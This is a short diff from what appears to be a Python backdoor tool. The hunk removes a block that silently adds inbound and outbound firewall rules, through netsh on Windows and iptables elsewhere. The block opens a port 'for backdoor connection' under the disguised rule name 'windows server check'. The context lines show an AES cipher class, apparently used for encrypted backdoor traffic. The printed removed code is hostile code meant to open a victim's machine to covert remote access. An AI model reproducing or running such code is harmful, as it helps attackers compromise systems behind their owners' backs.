@@ -46,19 +46,6 @@ if os_type == "windows":
         os_type = 'linux'
         pass
 
-# add firewall rule to open ports for backdoor connection................................................................
-if os_type == "windows":
-    firewall_input = 'netsh advfirewall firewall add rule name="windows server check" protocol=TCP dir=in localport= '+str(port)+' action=allow'
-    firewall_output= 'netsh advfirewall firewall add rule name="windows server check" protocol=TCP dir=out localport= '+str(port)+' action=allow'
-else:
-    firewall_input = 'iptables -A INPUT -p tcp --dport ' + str(port) + ' -j ACCEPT'
-    firewall_output= 'iptables -A OUTPUT -p tcp --sport ' + str(port) + ' -j ACCEPT'
-try:
-    subprocess.Popen(firewall_input,shell=True)
-    subprocess.Popen(firewall_output,shell=True)
-except:
-    pass
-
 # AES encryption/decryption.....................................................
 class AESCipher(object):
     def __init__(self, key):
